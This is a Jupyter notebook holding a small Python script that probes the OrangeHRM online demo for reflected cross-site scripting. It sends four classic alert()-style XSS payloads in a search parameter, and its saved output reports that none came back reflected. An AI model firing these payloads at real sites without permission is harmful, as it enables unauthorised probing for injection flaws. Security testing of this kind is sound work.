{
 "cells": [
  {
   "cell_type": "code",
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-09-11T19:08:31.050367Z",
     "start_time": "2024-09-11T19:08:27.875404Z"
    }
   },
   "source": [
    "import requests\n",
    "\n",
    "def test_xss(url):\n",
    "    payloads = [\n",
    "        \"<script>alert('XSS')</script>\",\n",
    "        \"<img src='x' onerror='alert(1)'>\",\n",
    "        \"<svg onload=alert('XSS')>\",\n",
    "        \"javascript:alert('XSS')\"\n",
    "    ]\n",
    "\n",
    "    for payload in payloads:\n",
    "        test_url = f\"{url}?search={payload}\"\n",
    "        response = requests.get(test_url)\n",
    "        if payload in response.text:\n",
    "            print(f\"Possible XSS found with payload: {payload}\")\n",
    "        else:\n",
    "            print(f\"No XSS with payload: {payload}\")\n",
    "\n",
    "# Запуск теста в Jupyter\n",
    "if __name__ == \"__main__\":\n",
    "    test_url = \"https://opensource-demo.orangehrmlive.com/web/index.php\"\n",
    "    test_xss(test_url)"
   ],
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No XSS with payload: <script>alert('XSS')</script>\n",
      "No XSS with payload: <img src='x' onerror='alert(1)'>\n",
      "No XSS with payload: <svg onload=alert('XSS')>\n",
      "No XSS with payload: javascript:alert('XSS')\n"
     ]
    }
   ],
   "execution_count": 2
  },
  {
   "metadata": {},
   "cell_type": "code",
   "outputs": [],
   "execution_count": null,
   "source": "",
   "id": "fd1328462d681d8e"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
